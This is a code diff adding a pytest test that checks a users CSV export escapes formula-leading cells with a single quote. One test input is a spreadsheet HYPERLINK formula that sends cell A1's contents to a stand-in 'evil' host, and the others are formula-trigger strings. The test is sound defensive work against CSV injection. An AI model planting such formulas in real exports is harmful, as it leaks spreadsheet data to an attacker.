@@ -281,6 +281,50 @@ class TestUsersExport:
         data_row = next(r for r in csv_rows[1:] if r)
         assert data_row[_EXPECTED_HEADER.index("Last Active")] == ""
 
+    @pytest.mark.parametrize(
+        "raw_user_id",
+        [
+            '=HYPERLINK("http://evil/?"&A1,"x")',
+            "@SUM(A1:A2)",
+            "+1+1",
+            "-2+3",
+            "\tlead-tab",
+            "\rlead-cr",
+        ],
+    )
+    def test_export_escapes_formula_cells(
+        self, auth_client, organization, workspace, observe_project, raw_user_id
+    ):
+        # user_id is customer-controlled (end-user IDs come from the customer's
+        # own instrumentation). A cell starting with = + - @ tab or CR executes
+        # as a formula when the CSV is opened in Excel/Sheets, so the export
+        # must prefix it with a single quote.
+        now = timezone.now()
+        filters = _date_filters(now - timedelta(hours=1), now + timedelta(hours=1))
+        rows = [_row(user_id=raw_user_id, project_id=observe_project.id)]
+
+        with (
+            patch.object(
+                AnalyticsQueryService,
+                "execute_ch_query",
+                return_value=_ch_stub(rows),
+            ),
+        ):
+            response = auth_client.get(
+                "/tracer/users/",
+                {
+                    "project_id": str(observe_project.id),
+                    "filters": json.dumps(filters),
+                    "export": "true",
+                },
+            )
+
+        csv_rows = _parse_csv(response)
+        data_row = next(r for r in csv_rows[1:] if r)
+        cell = data_row[_EXPECTED_HEADER.index("User ID")]
+        assert cell == "'" + raw_user_id
+        assert cell[0] == "'"
+
     def test_export_filename_defaults_to_all_when_no_project(
         self, auth_client, organization, workspace, observe_project
     ):
